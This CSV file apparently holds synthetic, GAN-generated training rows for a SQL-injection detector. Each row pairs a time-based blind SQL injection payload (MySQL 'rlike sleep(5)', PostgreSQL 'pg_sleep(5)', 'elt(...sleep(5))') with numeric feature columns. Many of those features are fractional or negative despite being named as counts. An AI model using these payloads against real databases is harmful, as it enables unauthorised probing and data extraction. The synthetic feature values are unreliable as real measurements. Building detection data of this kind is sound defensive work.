id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000461,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,4.480027183143573,72.69001770019531,21.933731079101562,7.501586437225342,28.956274032592773,0.5599340796470642,23.44291877746582,11.141318321228027,1.0596983432769775,0.31469088792800903,0.11008770018815994,0.4041396677494049,0.15555189549922943,3.460481643676758,1.0652236938476562,0.6476477980613708,0.6509515047073364,0.21059204638004303,0.01703513413667679,0.0052182599902153015,2.229403018951416,2.7299246788024902,0.3557252883911133,0.09264903515577316,0.7002077102661133,0.04372262582182884,0.04949390888214111,0.10543642938137054,0.027411267161369324,0.16734519600868225,0.1256403923034668,0.06236693263053894,0.16045129299163818,-0.047196079045534134,0.6262691617012024,0.6686800122261047,1.7843153476715088,0.4533504545688629,0.5783082842826843,0.1096571832895279,0.20223428308963776,0.24726904928684235,0.551849365234375,0.19705794751644135,0.12016260623931885,0.17889009416103363,0.111947201192379,0.009803981520235538,-0.010668623261153698,0.007846835069358349,-0.010646759532392025,0.023353951051831245,-0.06859613955020905,-0.010800495743751526,0.004652367439121008,-0.047420844435691833,0.004126355051994324,-0.012924164533615112,0.07902345061302185,0.1165270060300827,0.01188015565276146,0.10283441096544266,0.05000348761677742,-0.033959902822971344,0.24482247233390808,-0.009922638535499573,-0.1327441930770874,-0.012196473777294159,-0.0494677871465683,-0.09501244872808456,0.1127522736787796,-0.03588642179965973,-0.0785505622625351,0.04178941994905472,0.10661828517913818,0.0414123609662056,0.531605064868927,0.39771220088005066,0.06891467422246933,0.029300149530172348,0.015347674489021301,3.3334507942199707,0.5790709853172302,0.04600399732589722,0.9179475903511047,0.24739207327365875,-0.04576963186264038,0.13030791282653809,0.03359762206673622
GAN_000462,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,4.678231701955891,72.51167297363281,22.547685623168945,6.757711887359619,29.3952693939209,0.4144408106803894,24.326690673828125,11.506978034973145,0.865517795085907,0.298562228679657,0.1206221804022789,0.41626033186912537,0.1442067176103592,3.4782280921936035,1.051041603088379,0.711918294429779,0.6116155982017517,0.15936489403247833,0.240717813372612,0.11696437746286392,2.222193956375122,2.9514317512512207,0.38261547684669495,0.08709898591041565,0.5771086812019348,0.03646174073219299,0.03405296802520752,0.06529194116592407,0.06441257894039154,0.12573057413101196,0.13762404024600983,0.09619119763374329,0.14444856345653534,-0.09000468254089355,0.6370075941085815,0.5851094126701355,1.7906826734542847,0.6280962228775024,0.5197616219520569,0.1460752785205841,0.1686106026172638,0.24408525228500366,0.45246264338493347,0.21362914144992828,0.05479475483298302,0.12606574594974518,0.19116461277008057,0.023000448942184448,0.006756305694580078,0.016253016889095306,-0.01710125245153904,0.010335027240216732,-0.10375721752643585,-0.0030124932527542114,-0.09664905816316605,-0.05851994454860687,-0.006509955041110516,0.16761431097984314,0.10365153849124908,0.17220577597618103,0.014096963219344616,0.16893982887268066,-0.08624919503927231,-0.05327336862683296,0.3526550531387329,0.03917562589049339,-0.25390031933784485,0.06885454803705215,-0.07459373027086258,-0.06339456886053085,0.07921405136585236,-0.1557231843471527,-0.08508904278278351,-0.13155736029148102,0.13922449946403503,0.013070483691990376,0.6461464166641235,0.37385329604148865,0.07161735743284225,-0.01103005837649107,-0.06589467823505402,2.8679141998291016,0.6581584215164185,0.09915825724601746,0.7317706346511841,0.27212321758270264,0.1242995411157608,0.0346447229385376,0.04056292399764061
GAN_000463,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,4.5736016234544365,71.79402923583984,22.033796310424805,7.500458717346191,26.798208236694336,0.6715332865715027,23.268152236938477,11.486520767211914,1.2365049123764038,0.3075810968875885,0.11437612026929855,0.39457109570503235,0.1472489833831787,3.425114154815674,0.9489281177520752,0.5867705345153809,0.701457142829895,0.20790910720825195,0.02271926775574684,-0.08307386934757233,2.6091976165771484,2.781597375869751,0.4260656237602234,0.0999038815498352,0.6786304712295532,0.04379792511463165,0.05017533525824547,0.12091352045536041,0.02621806412935257,0.1324615478515625,0.12835827469825745,0.12650467455387115,0.1825655996799469,-0.04384278878569603,0.6582076549530029,0.7735324501991272,1.7861348390579224,0.36903974413871765,0.5657883286476135,0.08974049985408783,0.2637297809123993,0.21701358258724213,0.4760110378265381,0.17151561379432678,0.09564374387264252,0.18398147821426392,0.10330131649971008,0.006638624705374241,0.013750952668488026,0.01424933411180973,-0.035382337868213654,0.01291906088590622,-0.19401554763317108,0.010418348014354706,0.10926459729671478,-0.10593800246715546,-0.00229000230319798,0.026793234050273895,0.19047005474567413,0.2151472121477127,0.03193944692611694,0.3811551034450531,0.08998030424118042,-0.07120108604431152,0.3287966847419739,0.054299745708703995,-0.06295190751552582,-0.17256680130958557,-0.07856913655996323,-0.17656943202018738,0.016611050814390182,-0.07863527536392212,-0.08500531315803528,-0.21401013433933258,0.17264863848686218,0.03822176158428192,0.5268138647079468,0.4529203176498413,0.0832965075969696,0.003487412817776203,-0.058847859501838684,3.261368751525879,0.6014313101768494,0.21752673387527466,0.9464751482009888,0.2640669345855713,-0.21674193441867828,0.14941874146461487,0.06967442482709885
GAN_000464,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,4.581823788651595,69.36298370361328,22.290945053100586,7.4914751052856445,27.563549041748047,0.34735044836997986,24.511688232421875,11.707808494567871,1.0274595022201538,0.3022145628929138,0.12043248116970062,0.3969155550003052,0.15376941859722137,3.4467344284057617,1.1993093490600586,0.5516662001609802,0.6436811089515686,0.20340374112129211,0.008373922668397427,0.15480811893939972,2.2386765480041504,2.7515716552734375,0.41069984436035156,0.07074250280857086,0.5940415263175964,0.03270908445119858,0.020242130383849144,0.1383364349603653,0.00691060209646821,0.1535368710756302,0.11902403831481934,-0.02551194280385971,0.18301846086978912,0.029725193977355957,0.6559790968894958,0.7251461148262024,1.7680875062942505,0.43499520421028137,0.5310792326927185,0.13191182911396027,0.17360691726207733,0.22977495193481445,0.544567346572876,0.19444093108177185,0.1118931770324707,0.21449202299118042,0.16723774373531342,0.01613401062786579,-0.0014619455905631185,0.0030011299531906843,-0.02381443977355957,0.020570658147335052,-0.07603660225868225,-0.19447064399719238,-0.08856461942195892,-0.03092886507511139,0.007032863795757294,0.04391848295927048,-0.05983754247426987,0.24780632555484772,0.011634111404418945,0.18862652778625488,0.029664263129234314,0.1251550316810608,0.28723078966140747,0.02209458127617836,-0.12847855687141418,-0.1106426790356636,-0.08598680794239044,-0.1720246970653534,0.15809570252895355,-0.1231776773929596,-0.06406481564044952,-0.0201084166765213,0.0600939579308033,0.03184736147522926,0.5815166234970093,0.37360870838165283,0.05840132758021355,0.03986770659685135,-0.0837600827217102,3.1412854194641113,0.6147339344024658,0.1775585263967514,0.7670012712478638,0.37793999910354614,-0.07826948165893555,0.11242316663265228,0.033561091870069504
GAN_000465,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,4.812699414253829,69.419921875,20.659114837646484,5.480874538421631,29.063987731933594,0.4483621418476105,25.750415802001953,11.915862083435059,0.7694436311721802,0.31184637546539307,0.11028589308261871,0.38607901334762573,0.1612628996372223,3.446256637573242,1.018254280090332,0.5377331376075745,0.4096911549568176,0.19685758650302887,-0.001432996243238449,0.10270597785711288,2.1897149085998535,2.6049368381500244,0.3860701322555542,0.1137525662779808,0.6348235607147217,0.05530413240194321,0.006096272729337215,0.03489821404218674,-0.03549469634890556,0.19902119040489197,0.10356041043996811,0.03143242001533508,0.17341870069503784,-0.2802957594394684,0.6709688901901245,0.65253084897995,1.9139424562454224,0.34872573614120483,0.6406078934669495,0.11194290220737457,0.19247455894947052,0.25488898158073425,0.5190119743347168,0.21571077406406403,0.15577073395252228,0.21172195672988892,0.17014893889427185,-0.000527987431269139,-0.01559352781623602,0.0123166274279356,-0.028339184820652008,0.014171040616929531,0.04764483496546745,-0.07927581667900085,0.041393134742975235,-0.3354675769805908,-0.02621200680732727,-0.18182766437530518,0.14689667522907257,0.2796146273612976,0.01719648204743862,0.13828140497207642,-0.054599083960056305,0.04440970718860626,0.2425384521484375,0.059476982802152634,-0.325322687625885,0.20434299111366272,-0.009123070165514946,-0.13997620344161987,-0.018600136041641235,0.039400242269039154,-0.025764193385839462,-0.007987231016159058,0.20942077040672302,0.0241206344217062,0.6076827049255371,0.38957083225250244,0.07387606054544449,0.027024444192647934,0.09414860606193542,3.4964137077331543,0.6767897605895996,0.0401168018579483,0.9468550682067871,0.2753466069698334,-0.11485886573791504,0.3395002484321594,0.06778647750616074
GAN_000466,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,4.51132681567184,71.91307067871094,21.453426361083984,8.44867992401123,28.742149353027344,0.5280187129974365,23.369213104248047,10.962940216064453,0.9604687690734863,0.3237450420856476,0.11002760380506516,0.399450421333313,0.15559881925582886,3.4551568031311035,1.122657299041748,0.5132330656051636,0.6848013401031494,0.2630104422569275,0.09843076765537262,0.03351270407438278,2.144073963165283,2.8813817501068115,0.4089844226837158,0.07975438982248306,0.702974259853363,0.06611630320549011,0.041980769485235214,0.17217828333377838,0.05939093604683876,0.17789201438426971,0.10892944037914276,-0.1403597593307495,0.2237016260623932,0.02149006724357605,0.6632028818130493,0.8551139831542969,1.848327398300171,0.6443498134613037,0.5908883213996887,-0.04575727880001068,0.2138862907886505,0.2014627307653427,0.5534824728965759,0.1990898996591568,0.10410992801189423,0.19461584091186523,0.1315186768770218,0.010196502320468426,0.014132941141724586,0.012116271071135998,-1.355241465716972e-06,0.0036688807886093855,-0.0865442156791687,-0.09235309064388275,0.015952277928590775,0.10885857790708542,0.006389203947037458,0.043132856488227844,-0.12210800498723984,0.19371753931045532,0.023984665051102638,0.03375072777271271,0.08133293688297272,0.10160849988460541,0.1383882313966751,-0.060938261449337006,-0.12043208628892899,-0.15351565182209015,-0.03519159555435181,-0.015777163207530975,0.15783634781837463,-0.0758218839764595,-0.012407813221216202,-0.017470285296440125,-0.013678782619535923,0.02192591316998005,0.5594289302825928,0.46312886476516724,0.0641961544752121,0.06106335297226906,-0.11827751994132996,3.3761863708496094,0.5273389220237732,0.10520001500844955,1.0707629919052124,0.23135019838809967,-0.13451702892780304,-0.035268235951662064,0.050182465463876724
GAN_000467,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,4.823310481601239,69.61166381835938,20.600297927856445,6.577330589294434,28.0208740234375,0.16425307095050812,25.57174301147461,11.852633476257324,0.8355417251586914,0.2758261561393738,0.11338712275028229,0.40144088864326477,0.15136706829071045,3.4960594177246094,1.255036473274231,0.8139841556549072,0.5838058590888977,0.17623724043369293,0.1960839331150055,-0.01924833282828331,2.1336939334869385,3.03794527053833,0.3645339012145996,0.06947833299636841,0.5527080297470093,0.02535410225391388,0.010152655653655529,0.0189225971698761,0.02303515188395977,0.18123190104961395,0.1388883739709854,0.0758044421672821,0.16672243177890778,-0.03336084634065628,0.6946935653686523,0.5464468598365784,1.8300386667251587,0.4381357431411743,0.536338746547699,0.047658711671829224,0.16384777426719666,0.24236519634723663,0.4364475607872009,0.18161934614181519,0.07492266595363617,0.20921121537685394,0.21466577053070068,0.00716891884803772,0.0015438477275893092,0.01816670037806034,-0.041513603180646896,0.024665165692567825,0.020874980837106705,-0.07661104202270508,-0.11746751517057419,-0.01650203764438629,-0.005931795574724674,0.20777037739753723,0.06529910862445831,0.27708590030670166,0.01574844680726528,0.2514180541038513,-0.10491394251585007,-0.009067196398973465,0.24307765066623688,-0.05379965528845787,-0.19351038336753845,0.0027905255556106567,-0.06760263442993164,-0.07168569415807724,-0.015355370938777924,-0.12472857534885406,0.06211939454078674,0.054332807660102844,0.09630349278450012,0.02324160933494568,0.7148550152778625,0.3288955092430115,0.0571468323469162,-0.00939090084284544,-0.016359291970729828,3.1859054565429688,0.7288817763328552,0.07669103145599365,0.716590404510498,0.28512516617774963,0.1789456605911255,0.30404436588287354,0.05191998556256294
GAN_000468,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,4.83121669720136,70.61640930175781,20.18472671508789,7.341126441955566,31.09197235107422,0.3316669464111328,26.107563018798828,11.480765342712402,0.6843899488449097,0.304643839597702,0.11060591787099838,0.40385013818740845,0.14469122886657715,3.497459888458252,1.042500376701355,0.6609534025192261,0.5966812968254089,0.20406702160835266,0.29384034872055054,0.11986973136663437,2.1895792484283447,3.09977126121521,0.446255087852478,0.10858972370624542,0.568178653717041,0.06856135278940201,0.02355533093214035,0.050681278109550476,0.04929010197520256,0.17531685531139374,0.11880173534154892,-0.04182462394237518,0.18948796391487122,-0.20567873120307922,0.6760834455490112,0.6645069122314453,1.9272067546844482,0.6330863237380981,0.5676998496055603,0.04943592846393585,0.17471665143966675,0.22209355235099792,0.46620678901672363,0.20181094110012054,0.10849829018115997,0.14463399350643158,0.2141890525817871,0.0056268577463924885,0.020754322409629822,0.02438454143702984,-0.022997181862592697,-0.0016157814534381032,0.058415867388248444,-0.11093440651893616,-0.1341121941804886,-0.03438565135002136,0.004984619095921516,0.1228741928935051,-0.07840506732463837,0.29546788334846497,0.032086655497550964,0.0641205683350563,-0.06517799943685532,-0.06218354403972626,0.20689231157302856,0.03968005254864693,-0.4052441716194153,0.023109905421733856,-0.10741572082042694,0.061770837754011154,-0.02828030288219452,-0.07470283657312393,-0.05241820588707924,-0.12612754106521606,0.07825124263763428,0.0009613257134333253,0.7146437764167786,0.4568329453468323,0.08595546334981918,0.03529065474867821,-0.12911474704742432,3.1576969623565674,0.6656240224838257,0.10781588405370712,0.8789888620376587,0.27822262048721313,0.08877260982990265,0.14379897713661194,0.08300179988145828
GAN_000469,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,4.578940224397254,72.75862121582031,20.77656364440918,8.447032928466797,29.32576560974121,0.5557023882865906,25.019071578979492,11.146482467651367,1.0992027521133423,0.30450427532196045,0.11110911518335342,0.40235599875450134,0.14997543394565582,3.4260408878326416,1.0453437566757202,0.5051138401031494,0.6614193320274353,0.2379561811685562,0.15107141435146332,0.01823788322508335,2.171314239501953,2.9680604934692383,0.41603007912635803,0.09204614162445068,0.6099077463150024,0.05493216961622238,0.016208769753575325,0.10953909158706665,0.03277261182665825,0.13076306879520416,0.13991960883140564,0.01685713231563568,0.17844204604625702,-0.04985727742314339,0.6558681130409241,0.749783992767334,1.9180110692977905,0.5078188180923462,0.4535118043422699,0.08385856449604034,0.1905478686094284,0.19796016812324524,0.43764129281044006,0.18030473589897156,0.07355520874261856,0.1956396847963333,0.1377532035112381,0.012262970209121704,0.018671583384275436,0.005535786971449852,-0.02646416798233986,0.0054042343981564045,-0.17214204370975494,-0.035905975848436356,0.017817800864577293,0.05859983712434769,-0.0016873908462002873,0.18127170205116272,0.026511430740356445,0.11610017716884613,0.02049684152007103,0.2529310882091522,0.03960704803466797,-0.011143147945404053,0.2106068879365921,-0.018234413117170334,-0.22323322296142578,-0.13418935239315033,-0.027775024995207787,-0.1201377585530281,0.04399897903203964,-0.02363686077296734,-0.15207737684249878,-0.027836069464683533,0.13008739054203033,0.019142093136906624,0.588921844959259,0.40238359570503235,0.10109203308820724,0.01870599016547203,-0.15058663487434387,3.193441867828369,0.5847357511520386,0.1975325047969818,0.8443372249603271,0.20497122406959534,-0.035250477492809296,0.22840528190135956,0.05127939209342003
GAN_000470,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,4.650829502040626,71.82513427734375,20.717824935913086,8.005559921264648,29.648305892944336,0.6651718616485596,25.691768646240234,11.24920654296875,0.935188353061676,0.2955583930015564,0.11140111833810806,0.3970547914505005,0.14476162195205688,3.469141960144043,0.9571003317832947,0.4337092936038971,0.5932361483573914,0.19975361227989197,0.006982973776757717,0.022104142233729362,2.232732057571411,3.018704891204834,0.39924386143684387,0.09946338087320328,0.6559473872184753,0.06451044231653214,0.007235473953187466,0.08467746526002884,0.027890272438526154,0.14845490455627441,0.10379114001989365,0.058189600706100464,0.18705034255981445,-0.14357399940490723,0.6442234516143799,0.704606294631958,1.8719322681427002,0.5325090885162354,0.5058375597000122,0.013919942080974579,0.20997539162635803,0.2823038101196289,0.4807603359222412,0.15377727150917053,0.09272952377796173,0.17516152560710907,0.14854033291339874,0.003985394723713398,0.01305279042571783,0.010590272955596447,-0.02087530866265297,0.0020465876441448927,-0.07804915308952332,-0.06536252796649933,0.0645899549126625,0.02256578952074051,-0.0092034125700593,0.10389811545610428,0.12444160878658295,0.19060087203979492,0.019164299592375755,0.2301490604877472,0.0673246756196022,-0.016906704753637314,0.20623470842838287,0.060041751712560654,-0.2764192521572113,-0.11818155646324158,-0.019828451797366142,-0.07374019175767899,-0.0006815716624259949,-0.020317377522587776,-0.0534394271671772,-0.07652099430561066,-0.01412290334701538,0.025913605466485023,0.6155624389648438,0.44905078411102295,0.07902415841817856,0.008078326471149921,-0.018028192222118378,3.2933619022369385,0.6390131115913391,0.22928687930107117,0.8789230585098267,0.08647425472736359,-0.0632476806640625,0.08963833749294281,0.09315454959869385
GAN_000471,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,4.688991247736538,72.13025665283203,21.07583999633789,7.242932319641113,27.569087982177734,0.28937265276908875,23.38314437866211,11.637349128723145,1.0164834260940552,0.28421148657798767,0.11972619593143463,0.4096435606479645,0.15148532390594482,3.424649715423584,1.0939089059829712,0.7934704422950745,0.7143827080726624,0.28375616669654846,0.23320797085762024,0.011778375133872032,2.229884386062622,2.952353000640869,0.3424975872039795,0.06669522821903229,0.6117403507232666,0.06998647004365921,0.02266535721719265,0.0700819119811058,0.06081540510058403,0.20505493879318237,0.15599115192890167,0.08969670534133911,0.17108319699764252,-0.14479675889015198,0.6444030404090881,0.696686327457428,1.9536255598068237,0.38727641105651855,0.5548847913742065,0.06918656826019287,0.12121331691741943,0.2136090248823166,0.47339221835136414,0.21885472536087036,0.06831476092338562,0.15122419595718384,0.1871066838502884,0.010939078405499458,0.00688015716150403,0.009626267477869987,-0.04454771801829338,0.010434444062411785,0.01162814348936081,0.07822290807962418,-0.1512049436569214,0.030025511980056763,0.012073147110641003,0.19577407836914062,-0.07345506548881531,0.05990051478147507,0.033863045275211334,0.13207903504371643,-0.10090037435293198,0.024546340107917786,0.31655219197273254,-0.12309461832046509,-0.0732937753200531,0.044139422476291656,-0.0815499871969223,0.03771909326314926,0.07587550580501556,-0.09322164207696915,-0.14559243619441986,0.06166641786694527,0.2313956320285797,0.03007901832461357,0.6758177876472473,0.40006235241889954,0.07106562703847885,0.01045509148389101,0.05205675959587097,3.3024020195007324,0.6084945201873779,0.015734799206256866,0.8859513998031616,0.3428310453891754,0.09496918320655823,0.2141721248626709,0.022221406921744347
GAN_000472,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,4.755963753300404,69.09478759765625,21.284061431884766,6.318334102630615,27.82135581970215,0.5326075553894043,26.02777671813965,11.68976879119873,0.9092603921890259,0.29769816994667053,0.10555842518806458,0.3895074129104614,0.15369465947151184,3.4690353870391846,1.0859763622283936,0.4477207660675049,0.5178703665733337,0.19007129967212677,-0.0186671894043684,-0.12650041282176971,2.493828058242798,2.7287302017211914,0.32874804735183716,0.09916815161705017,0.563323974609375,0.05118091404438019,0.02853025682270527,0.0495343953371048,-0.035235535353422165,0.16955772042274475,0.13004396855831146,0.006839476525783539,0.17592254281044006,-0.19111917912960052,0.6545573472976685,0.684673011302948,1.9363985061645508,0.34900963306427,0.5661614537239075,0.09687855839729309,0.25527116656303406,0.27384546399116516,0.5566335916519165,0.16731253266334534,0.17261165380477905,0.19693025946617126,0.17373865842819214,-0.01435262430459261,-0.005525070242583752,0.027866408228874207,-0.04106985777616501,0.017164526507258415,0.14226575195789337,-0.07781028747558594,0.03287886828184128,-0.25106000900268555,-0.001289134961552918,-0.15009436011314392,0.02579835057258606,0.3976622223854065,0.020920533686876297,0.1744818091392517,0.017745740711688995,-0.023600002750754356,0.3474944531917572,0.21891526877880096,-0.2505807876586914,0.02691284567117691,-0.17637841403484344,-0.24302557110786438,-0.0707196518778801,-0.03988051414489746,-0.08411259949207306,-0.05718475580215454,0.005475431680679321,0.02825644426047802,0.5549076199531555,0.3361804485321045,0.06182984262704849,0.03478545323014259,0.07655138522386551,3.484934091567993,0.7025390267372131,0.05450557544827461,0.8965075016021729,0.39744529128074646,-0.007945606485009193,0.3189167380332947,0.07737769931554794
GAN_000473,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,4.567532936412851,72.87918853759766,21.54914093017578,7.938187599182129,29.527189254760742,0.5797034502029419,23.605209350585938,11.184128761291504,0.9546372294425964,0.3043426275253296,0.11013949662446976,0.3921318054199219,0.15348714590072632,3.427337408065796,1.0207955837249756,0.5753417015075684,0.6820878982543945,0.2368468940258026,-0.07876373827457428,0.055648863315582275,2.027527093887329,2.945695161819458,0.3884451985359192,0.08934810012578964,0.6837183237075806,0.04488727077841759,0.022216811776161194,0.12029387056827545,0.02232642099261284,0.14471076428890228,0.08746842294931412,0.10962770879268646,0.2060195505619049,-0.07421240210533142,0.6626638174057007,0.7242777347564697,1.9190967082977295,0.5816159248352051,0.5505207180976868,0.007039301097393036,0.16088460385799408,0.29851698875427246,0.5360682606697083,0.17148347198963165,0.13834236562252045,0.1782449334859848,0.15051577985286713,-0.0009802208514884114,0.0023718911688774824,-0.00030638108728453517,-0.020666901022195816,0.011124367825686932,0.002401694655418396,-0.012791309505701065,-0.03931737318634987,0.03213817626237869,0.010503526777029037,0.132167249917984,-0.014886967837810516,0.12218639254570007,0.016795292496681213,-0.013011634349822998,-0.021842949092388153,0.03426837921142578,0.2692359983921051,-0.04382597655057907,-0.051675260066986084,-0.13594873249530792,0.03287625312805176,-0.010851472616195679,0.11254124343395233,-0.11110277473926544,-0.12365664541721344,0.036663711071014404,0.003505941480398178,0.04360966011881828,0.6325758695602417,0.43943244218826294,0.06987527757883072,0.05540262907743454,0.04815036058425903,3.51155424118042,0.5548752546310425,0.11554870754480362,0.923096239566803,0.09555114805698395,-0.09534408897161484,-0.006437851116061211,0.04337085410952568
GAN_000474,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,4.658678402524212,69.39057159423828,22.70380973815918,6.4964776039123535,27.602083206176758,0.39041048288345337,22.122835159301758,11.981242179870605,1.1813478469848633,0.2982437312602997,0.1203039139509201,0.3871607482433319,0.15720278024673462,3.414243459701538,1.29435133934021,0.5582652688026428,0.7178815603256226,0.2699035108089447,0.03132827579975128,0.25810253620147705,2.3433077335357666,2.5205180644989014,0.4471126198768616,0.08551153540611267,0.5813456773757935,0.02199576422572136,0.04010009765625,0.1355830579996109,-0.008790651336312294,0.18082267045974731,0.11905873566865921,0.13551370799541473,0.18347637355327606,0.10057626664638519,0.6752841472625732,0.6626444458961487,1.6546207666397095,0.25791409611701965,0.5311853289604187,0.21313312649726868,0.17449530959129333,0.25699615478515625,0.5942078232765198,0.1634969264268875,0.09539785981178284,0.23047345876693726,0.13775025308132172,0.01275385357439518,-0.022058360278606415,-0.0004066835972480476,-0.052456147968769073,0.037660151720047,-0.039906762540340424,-0.09528195858001709,-0.029463641345500946,-0.16870184242725372,0.013007796369493008,-0.00016830489039421082,0.07840156555175781,0.17464867234230042,0.004149471875280142,0.13719147443771362,-0.012174174189567566,0.11902879178524017,0.2596884071826935,-0.0009277649223804474,-0.12834486365318298,-0.1075270026922226,-0.007343435660004616,-0.14022022485733032,0.16627246141433716,-0.14324432611465454,-0.16320957243442535,0.10072953999042511,0.12850430607795715,0.051522716879844666,0.6034177541732788,0.36803707480430603,0.043731942772865295,-0.01333638560026884,-0.054340243339538574,3.4167275428771973,0.5818811655044556,0.14582690596580505,0.7111059427261353,0.31605473160743713,-0.17425908148288727,0.321857750415802,0.018607649952173233
GAN_000475,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,4.578120607024407,73.67357635498047,23.084716796875,8.269067764282227,26.169757843017578,0.6369840502738953,21.756126403808594,11.46195125579834,1.146248698234558,0.3005256950855255,0.1194719523191452,0.402832567691803,0.15575972199440002,3.337385654449463,1.0962339639663696,0.6406504511833191,0.8418728113174438,0.23381216824054718,0.13963592052459717,-0.10947787761688232,2.1532397270202637,2.7451107501983643,0.39997971057891846,0.08898016810417175,0.621261715888977,0.05874883383512497,0.05483391880989075,0.18169744312763214,0.06520184874534607,0.1612212061882019,0.11348804831504822,0.10230886936187744,0.20045281946659088,0.15292418003082275,0.6661887168884277,0.8730581402778625,1.800045371055603,0.47082459926605225,0.5523781180381775,-0.09858681261539459,0.22232556343078613,0.19027739763259888,0.4965026080608368,0.1601172536611557,0.06535682827234268,0.19945837557315826,0.11965413391590118,0.011626018211245537,0.004851125180721283,-0.002696437994018197,-0.03185667097568512,0.022147972136735916,-0.29365772008895874,0.1038360521197319,0.06054558977484703,0.16652227938175201,0.01798829436302185,0.2596980333328247,-0.02174977958202362,0.11789479851722717,0.02210943028330803,0.2334141731262207,-0.007148459553718567,0.12845079600811005,0.3499915599822998,-0.07134298235177994,0.11748016625642776,-0.2533319592475891,-0.02703476883471012,-0.08365888148546219,0.1359705924987793,-0.303182452917099,-0.1748502254486084,-0.13995344936847687,0.1456429809331894,0.0438675694167614,0.6105654835700989,0.40344247221946716,0.07809533923864365,-0.010895068757236004,-0.17610178887844086,3.204038143157959,0.5712227821350098,0.17852510511875153,0.8826836347579956,0.2945042848587036,-0.14312633872032166,0.04205983132123947,0.042008139193058014
